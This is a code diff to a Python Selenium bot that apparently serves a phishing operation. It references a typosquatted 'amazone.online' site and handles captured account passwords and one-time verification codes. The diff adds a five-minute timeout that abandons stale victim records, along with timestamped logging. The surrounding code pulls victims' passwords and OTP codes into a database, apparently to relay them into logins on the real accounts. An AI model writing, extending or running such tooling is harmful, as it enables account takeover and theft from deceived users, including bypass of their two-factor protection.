@@ -16,9 +16,10 @@ from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
 from selenium.webdriver.common.alert import Alert
 import a_db
 import json
+sessin_data_log = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H-%M-%S")
 logging.basicConfig(level=logging.INFO,
                     format='(%(module)s) %(message)s',
-                    handlers=[logging.FileHandler("session.log", 'w+', 'utf-8')])
+                    handlers=[logging.FileHandler(f"session_{sessin_data_log}.log", 'a', 'utf-8')])
 logger = logging.getLogger("Log")
 url_fake_site = "https://amazone.online"
 
@@ -130,6 +131,20 @@ class Abrowser(object):
             for d in newlist:
                 acc_id = d["id"]
                 if int(acc_id) == user_id:
+                    acc_datetime = d["updated_at"]
+                    acc_datetime = acc_datetime[:-5]
+                    acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
+                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
+                    datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
+                    datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
+                    diff_datetime = datetime_now - acc_datetime
+                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
+                    if (diff_datetime.seconds / 60) > 5:
+                        # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
+                        a_db.acc_change_status(int(acc_id), "5 min waited")
+                        a_db.acc_stop_work(int(acc_id))
+                        self.print(f"Acc id_db {id_db} with id {acc_id} end work by 5 min waited")
+                        break
                     acc_password = d["password"]
                     a_db.acc_set_password(id_db, acc_password)
                     self.print(f"Set password {acc_password} to acc id_db {id_db}")
@@ -152,6 +167,20 @@ class Abrowser(object):
             for d in newlist:
                 acc_id = d["id"]
                 if int(acc_id) == user_id:
+                    acc_datetime = d["updated_at"]
+                    acc_datetime = acc_datetime[:-5]
+                    acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
+                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
+                    datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
+                    datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
+                    diff_datetime = datetime_now - acc_datetime
+                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
+                    if (diff_datetime.seconds / 60) > 5:
+                        # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
+                        a_db.acc_change_status(int(acc_id), "5 min waited")
+                        a_db.acc_stop_work(int(acc_id))
+                        self.print(f"Acc id_db {id_db} with id {acc_id} end work by 5 min waited")
+                        break
                     acc_verification_type= d["verification_type"]
                     if "email/phone" in acc_verification_type:
                         pass
@@ -180,6 +209,20 @@ class Abrowser(object):
             for d in newlist:
                 acc_id = d["id"]
                 if int(acc_id) == user_id:
+                    acc_datetime = d["updated_at"]
+                    acc_datetime = acc_datetime[:-5]
+                    acc_datetime = datetime.datetime.strptime(acc_datetime, '%Y-%m-%dT%H:%M:%S')
+                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime} after change")
+                    datetime_now = datetime.datetime.utcnow().strftime("%Y-%m-%dT%H:%M:%S")
+                    datetime_now = datetime.datetime.strptime(datetime_now, '%Y-%m-%dT%H:%M:%S')
+                    diff_datetime = datetime_now - acc_datetime
+                    # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different from now is {diff_datetime.seconds} seconds")
+                    if (diff_datetime.seconds / 60) > 5:
+                        # self.print(f"Acc with id {acc_id} and login {acc_login} and datetime {acc_datetime}: different MORE than 3 minutes")
+                        a_db.acc_change_status(int(acc_id), "5 min waited")
+                        a_db.acc_stop_work(int(acc_id))
+                        self.print(f"Acc id_db {id_db} with id {acc_id} end work by 5 min waited")
+                        break
                     acc_verification_code = d["verification_code"]
                     a_db.acc_set_code_otp(id_db, str(acc_verification_code))
                     break
